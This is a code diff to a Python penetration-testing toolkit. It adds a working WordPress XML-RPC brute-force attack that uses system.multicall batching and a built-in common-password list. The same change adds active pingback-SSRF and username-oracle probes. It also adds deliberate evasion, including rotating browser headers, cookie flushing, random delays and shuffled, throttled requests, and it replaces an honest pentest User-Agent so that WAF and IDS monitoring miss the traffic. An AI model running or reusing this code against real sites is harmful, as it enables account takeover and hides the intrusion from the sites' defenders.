@@ -4036,7 +4036,179 @@ def revshell_generator():
     print_warn("Use 'rlwrap nc -lvnp PORT' for a better shell experience")
 
 
+# ─── XML-RPC Brute Force (inline for CMS scanner) ────────────────────────────
+
+_XMLRPC_BF_USERNAMES = [
+    "admin", "administrator", "editor", "author", "wordpress",
+    "wp", "root", "test", "user", "manager", "webmaster",
+    "demo", "guest", "info", "support", "contact",
+]
+
+_XMLRPC_BF_PASSWORDS = [
+    "admin", "password", "123456", "12345678", "wordpress",
+    "admin123", "password123", "root", "toor", "test",
+    "123456789", "qwerty", "letmein", "welcome", "monkey",
+    "master", "dragon", "login", "abc123", "admin1",
+    "password1", "1234567890", "123123", "admin@123", "P@ssw0rd",
+    "passw0rd", "iloveyou", "trustno1", "sunshine", "princess",
+    "123456a", "654321", "admin1234", "pass123", "root123",
+    "changeme", "1q2w3e4r", "qwerty123", "password!", "admin!",
+]
+
+
+def _cms_xmlrpc_bruteforce(url, xmlrpc_url, session, methods):
+    """XML-RPC brute-force attack launched from CMS scanner when vuln is confirmed.
+    Inherits the stealth session (rotating UA/headers) and adds its own evasion."""
+    print(f"\n  {M}── XML-RPC Brute-Force Attack ──{RST}\n")
+
+    custom_user = input(f"  {Y}Username to target (blank = common list):{RST} ").strip()
+    usernames = [custom_user] if custom_user else _XMLRPC_BF_USERNAMES
+
+    custom_pass_file = input(f"  {Y}Password file path (blank = built-in list):{RST} ").strip()
+    passwords = list(_XMLRPC_BF_PASSWORDS)
+    if custom_pass_file:
+        try:
+            with open(custom_pass_file, "r") as f:
+                passwords = [line.strip() for line in f if line.strip()]
+            print_ok(f"Loaded {len(passwords)} passwords from file")
+        except Exception as e:
+            print_err(f"Could not load file: {e}. Using built-in list.")
+
+    use_multicall = "system.multicall" in methods
+    batch_size = 5 if use_multicall else 1
+
+    if use_multicall:
+        print_ok(f"Using system.multicall amplification (batch size: {batch_size})")
+    else:
+        print_warn("system.multicall not available — single request per credential")
+
+    total = len(usernames) * len(passwords)
+    tested = 0
+    found_creds = []
+    req_count = 0  # track requests for periodic cookie flush
+
+    print(f"  {Y}Testing {len(usernames)} username(s) x {len(passwords)} password(s) = {total} combinations{RST}\n")
+
+    for username in usernames:
+        if use_multicall:
+            for i in range(0, len(passwords), batch_size):
+                batch = passwords[i:i + batch_size]
+                multicall = (
+                    '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
+                    '<params><param><value><array><data>'
+                )
+                for pwd in batch:
+                    safe_user = username.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+                    safe_pwd = pwd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+                    multicall += (
+                        '<value><struct>'
+                        '<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
+                        '<member><name>params</name><value><array><data>'
+                        f'<value><string>{safe_user}</string></value>'
+                        f'<value><string>{safe_pwd}</string></value>'
+                        '</data></array></value></member>'
+                        '</struct></value>'
+                    )
+                multicall += '</data></array></value></param></params></methodCall>'
+
+                try:
+                    resp = session.post(xmlrpc_url, data=multicall,
+                                        headers={"Content-Type": "text/xml"}, timeout=15)
+                    if resp.status_code == 200:
+                        call_results = re.findall(
+                            r"<value>\s*(<array>.*?</array>|<struct>.*?</struct>)\s*</value>",
+                            resp.text, re.DOTALL
+                        )
+                        for j, pwd in enumerate(batch):
+                            tested += 1
+                            if j < len(call_results):
+                                chunk = call_results[j]
+                                if "faultCode" not in chunk and ("isAdmin" in chunk or "blogName" in chunk or "blogid" in chunk):
+                                    print(f"\n    {R}[CRED FOUND]{RST} {username}:{pwd}")
+                                    found_creds.append((username, pwd))
+                    else:
+                        tested += len(batch)
+                except Exception:
+                    tested += len(batch)
+
+                req_count += 1
+                # Flush cookies every ~10 requests to break session tracking
+                if req_count % 10 == 0:
+                    session.cookies.clear()
+                sys.stdout.write(f"\r  {Y}Progress: {tested}/{total} ({tested * 100 // max(total, 1)}%){RST}    ")
+                sys.stdout.flush()
+                # Jittered delay between batches
+                _cms_jitter(0.3, 1.5)
+        else:
+            for pwd in passwords:
+                tested += 1
+                safe_user = username.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+                safe_pwd = pwd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+                payload = (
+                    '<?xml version="1.0"?>'
+                    '<methodCall><methodName>wp.getUsersBlogs</methodName><params>'
+                    f'<param><value><string>{safe_user}</string></value></param>'
+                    f'<param><value><string>{safe_pwd}</string></value></param>'
+                    '</params></methodCall>'
+                )
+                try:
+                    resp = session.post(xmlrpc_url, data=payload,
+                                        headers={"Content-Type": "text/xml"}, timeout=10)
+                    if resp.status_code == 200 and "faultCode" not in resp.text:
+                        if "isAdmin" in resp.text or "blogName" in resp.text or "blogid" in resp.text:
+                            print(f"\n    {R}[CRED FOUND]{RST} {username}:{pwd}")
+                            found_creds.append((username, pwd))
+                except Exception:
+                    pass
+
+                req_count += 1
+                if req_count % 10 == 0:
+                    session.cookies.clear()
+                sys.stdout.write(f"\r  {Y}Progress: {tested}/{total} ({tested * 100 // max(total, 1)}%){RST}    ")
+                sys.stdout.flush()
+                _cms_jitter(0.5, 2.0)
+
+    print()
+    print(f"\n  {Y}{'═' * 50}{RST}")
+    print_row("Combinations tested", str(tested))
+    print_row("Credentials found", str(len(found_creds)))
+    if found_creds:
+        print(f"\n  {R}[!!!] Valid credentials:{RST}")
+        for u, p in found_creds:
+            print(f"      {R}•{RST} {u} : {p}")
+    else:
+        print_ok("No valid credentials found with the tested combinations.")
+
+
 # ─── 39. CMS Vulnerability Scanner ───────────────────────────────────────────
+
+def _cms_stealth_session(target_url):
+    """Create a requests.Session with anti-fingerprint measures for CMS scanning."""
+    s = requests.Session()
+    # Rotate full browser-like headers on every request via a hook
+    def _rotate_headers(prepared, *args, **kwargs):
+        hdrs = _random_stealth_headers()
+        # Add organic Referer from target itself
+        hdrs["Referer"] = target_url + "/"
+        for k, v in hdrs.items():
+            prepared.headers.setdefault(k, v)
+        # Remove any header that screams "scanner"
+        for bad in ("X-Requested-With",):
+            prepared.headers.pop(bad, None)
+    s.hooks["response"] = []  # clean slate
+    # Use prepare-level hook: override at send time
+    _orig_send = s.send
+    def _patched_send(prepared, **kw):
+        _rotate_headers(prepared)
+        return _orig_send(prepared, **kw)
+    s.send = _patched_send
+    return s
+
+
+def _cms_jitter(lo=0.3, hi=1.5):
+    """Random sleep to break timing patterns."""
+    time.sleep(random.uniform(lo, hi))
+
 
 def cms_vuln_scanner():
     print_header("CMS Vulnerability Scanner")
@@ -4050,8 +4222,7 @@ def cms_vuln_scanner():
         url = "https://" + url
     url = url.rstrip("/")
 
-    session = requests.Session()
-    session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS Pentest)"})
+    session = _cms_stealth_session(url)
 
     spinner("Detecting CMS...", 1.0)
 
@@ -4147,19 +4318,27 @@ def cms_vuln_scanner():
         ("/web.config", "IIS config"),
     ])
 
+    # Shuffle scan order to avoid signature-based detection
+    paths = list(paths)
+    random.shuffle(paths)
+
     spinner("Scanning known paths...", 0.5)
     findings = []
 
     def check_path(path_info):
         path, desc = path_info
         try:
+            # Per-request jitter to break timing correlation
+            time.sleep(random.uniform(0.2, 1.2))
             test_url = f"{url}{path}"
+            # Session auto-rotates UA/headers via patched send
             resp = session.get(test_url, timeout=6, allow_redirects=False)
             return path, desc, resp.status_code, len(resp.content), resp.text[:500]
         except Exception:
             return path, desc, 0, 0, ""
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
+    # Reduced concurrency to lower WAF/IDS burst signature
+    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as pool:
         futures = [pool.submit(check_path, p) for p in paths]
         for future in concurrent.futures.as_completed(futures):
             path, desc, code, size, preview = future.result()
@@ -4179,6 +4358,9 @@ def cms_vuln_scanner():
     # WordPress-specific deep checks
     if cms == "WordPress":
         print(f"\n  {M}── WordPress Deep Checks ──{RST}")
+        # Flush cookies between scan phases to break session correlation
+        session.cookies.clear()
+        _cms_jitter(0.8, 2.0)
         # Try user enumeration
         try:
             resp = session.get(f"{url}/wp-json/wp/v2/users", timeout=8)
@@ -4191,14 +4373,135 @@ def cms_vuln_scanner():
         except Exception:
             pass
 
-        # Check xmlrpc
+        # Check xmlrpc — active verification
+        _cms_jitter(1.0, 2.5)
+        session.cookies.clear()  # new session fingerprint for XML-RPC phase
+        xmlrpc_url = f"{url}/xmlrpc.php"
+        xmlrpc_active = False
+        xmlrpc_methods = []
         try:
-            resp = session.post(f"{url}/xmlrpc.php", timeout=8,
+            resp = session.post(xmlrpc_url, timeout=8,
                                 data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                                 headers={"Content-Type": "text/xml"})
             if resp.status_code == 200 and "methodResponse" in resp.text:
-                methods_count = resp.text.count("<string>")
-                print_err(f"XML-RPC enabled with {methods_count} methods (brute-force / DDoS vector)")
+                xmlrpc_active = True
+                xmlrpc_methods = re.findall(r"<string>(.*?)</string>", resp.text)
+                print_err(f"XML-RPC enabled with {len(xmlrpc_methods)} methods (brute-force / DDoS vector)")
+                findings.append(("/xmlrpc.php", "XML-RPC active", "confirmed"))
+
+                # ── Active verification: system.multicall brute-force amplification ──
+                if "system.multicall" in xmlrpc_methods:
+                    _cms_jitter(1.0, 3.0)
+                    # Randomize probe usernames to avoid static signature
+                    probe_u1 = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(5, 10)))
+                    probe_p1 = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(6, 12)))
+                    probe_p2 = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(6, 12)))
+                    multicall_payload = (
+                        '<?xml version="1.0"?>'
+                        '<methodCall><methodName>system.multicall</methodName>'
+                        '<params><param><value><array><data>'
+                        '<value><struct>'
+                        '<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
+                        '<member><name>params</name><value><array><data>'
+                        f'<value><string>{probe_u1}</string></value>'
+                        f'<value><string>{probe_p1}</string></value>'
+                        '</data></array></value></member>'
+                        '</struct></value>'
+                        '<value><struct>'
+                        '<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
+                        '<member><name>params</name><value><array><data>'
+                        f'<value><string>{probe_u1}</string></value>'
+                        f'<value><string>{probe_p2}</string></value>'
+                        '</data></array></value></member>'
+                        '</struct></value>'
+                        '</data></array></value></param></params></methodCall>'
+                    )
+                    try:
+                        mc_resp = session.post(xmlrpc_url, data=multicall_payload,
+                                               headers={"Content-Type": "text/xml"}, timeout=10)
+                        if mc_resp.status_code == 200 and "methodResponse" in mc_resp.text:
+                            print(f"    {R}[VULN]{RST} system.multicall accepts batched auth — brute-force amplification CONFIRMED")
+                            findings.append(("/xmlrpc.php", "Multicall brute-force", "confirmed"))
+                        else:
+                            print(f"    {G}[SAFE]{RST} system.multicall restricted or blocked")
+                    except Exception:
+                        pass
+
+                # ── Active verification: pingback SSRF ──
+                if "pingback.ping" in xmlrpc_methods:
+                    _cms_jitter(1.0, 3.0)
+                    session.cookies.clear()
+                    pingback_payload = (
+                        '<?xml version="1.0"?>'
+                        '<methodCall><methodName>pingback.ping</methodName><params>'
+                        f'<param><value><string>http://127.0.0.1:80/</string></value></param>'
+                        f'<param><value><string>{url}/?p=1</string></value></param>'
+                        '</params></methodCall>'
+                    )
+                    try:
+                        pb_resp = session.post(xmlrpc_url, data=pingback_payload,
+                                               headers={"Content-Type": "text/xml"}, timeout=10)
+                        if "faultCode" in pb_resp.text:
+                            fault = re.search(r"<int>(\d+)</int>", pb_resp.text)
+                            fc = fault.group(1) if fault else "?"
+                            if fc == "0":
+                                print(f"    {R}[VULN]{RST} Pingback SSRF — server accepts arbitrary outbound requests")
+                                findings.append(("/xmlrpc.php", "Pingback SSRF", "confirmed"))
+                            elif fc in ("17", "48"):
+                                print(f"    {Y}[PARTIAL]{RST} Pingback processed (fault {fc}) — outbound request made, SSRF likely")
+                                findings.append(("/xmlrpc.php", "Pingback SSRF partial", "likely"))
+                            else:
+                                print(f"    {Y}[INFO]{RST} Pingback returned fault code {fc}")
+                        else:
+                            print(f"    {R}[VULN]{RST} Pingback accepted without fault — SSRF confirmed")
+                            findings.append(("/xmlrpc.php", "Pingback SSRF", "confirmed"))
+                    except Exception:
+                        pass
+
+                # ── Active verification: username oracle ──
+                if "wp.getUsersBlogs" in xmlrpc_methods:
+                    _cms_jitter(1.0, 3.0)
+                    session.cookies.clear()
+                    # Random wrong password to avoid static payload signature
+                    rand_pass = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(8, 14)))
+                    oracle_payload = (
+                        '<?xml version="1.0"?>'
+                        '<methodCall><methodName>wp.getUsersBlogs</methodName><params>'
+                        '<param><value><string>admin</string></value></param>'
+                        f'<param><value><string>{rand_pass}</string></value></param>'
+                        '</params></methodCall>'
+                    )
+                    try:
+                        or_resp = session.post(xmlrpc_url, data=oracle_payload,
+                                               headers={"Content-Type": "text/xml"}, timeout=10)
+                        if "incorrect_password" in or_resp.text.lower() or "Incorrect password" in or_resp.text:
+                            print(f"    {R}[VULN]{RST} Username oracle — user 'admin' EXISTS (server leaks 'Incorrect password')")
+                            findings.append(("/xmlrpc.php", "Username oracle: admin exists", "confirmed"))
+                        elif "Incorrect username" in or_resp.text:
+                            print(f"    {Y}[INFO]{RST} Username oracle — user 'admin' does NOT exist")
+                        elif "faultString" in or_resp.text:
+                            print(f"    {Y}[INFO]{RST} wp.getUsersBlogs responds with error (login lockout or protection active)")
+                    except Exception:
+                        pass
+
+                # ── High-risk method summary ──
+                risk_map = {
+                    "CRITICAL": ["wp.newPost", "wp.editPost", "wp.deletePost", "wp.uploadFile", "metaWeblog.newPost"],
+                    "HIGH": ["pingback.ping", "system.multicall", "wp.getUsers", "wp.getOptions"],
+                }
+                crit = [m for m in risk_map["CRITICAL"] if m in xmlrpc_methods]
+                high = [m for m in risk_map["HIGH"] if m in xmlrpc_methods]
+                if crit:
+                    print(f"    {R}[!!!] CRITICAL methods exposed:{RST} {', '.join(crit)}")
+                if high:
+                    print(f"    {R}[!] HIGH risk methods:{RST} {', '.join(high)}")
+
+                # ── Offer brute-force attack ──
+                print(f"\n    {Y}XML-RPC brute-force vector confirmed.{RST}")
+                run_bf = input(f"    {Y}Launch XML-RPC brute-force attack? (y/N):{RST} ").strip().lower()
+                if run_bf in ("y", "yes", "si", "s"):
+                    _cms_xmlrpc_bruteforce(url, xmlrpc_url, session, xmlrpc_methods)
+
         except Exception:
             pass
 
